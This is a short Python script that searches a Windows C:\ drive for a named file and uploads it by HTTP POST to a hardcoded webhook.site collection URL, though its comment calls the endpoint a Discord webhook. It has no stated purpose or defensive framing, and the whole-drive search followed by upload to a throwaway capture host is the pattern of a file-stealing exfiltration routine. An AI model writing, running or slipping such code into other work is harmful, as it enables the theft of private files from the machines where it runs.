import os
import requests

def find_file(filename, search_path):
    for root, dirs, files in os.walk(search_path):
        if filename in files:
            return os.path.join(root, filename)
    return None

search_path = 'C:\\'  # Specify the starting search directory
filename = 'test.txt'  # Replace with your file's name
file_path = find_file(filename, search_path)

def send_file_to_discord(file_path, webhook_url):
    with open(file_path, 'rb') as file_content:
        response = requests.post(webhook_url, files={
            'file': file_content,
        })
        

webhook_url = "https://webhook.site/f946fd41-df08-44f8-b5d1-39a5513a47d2"  # Replace with your Discord webhook URL
send_file_to_discord(file_path, webhook_url)
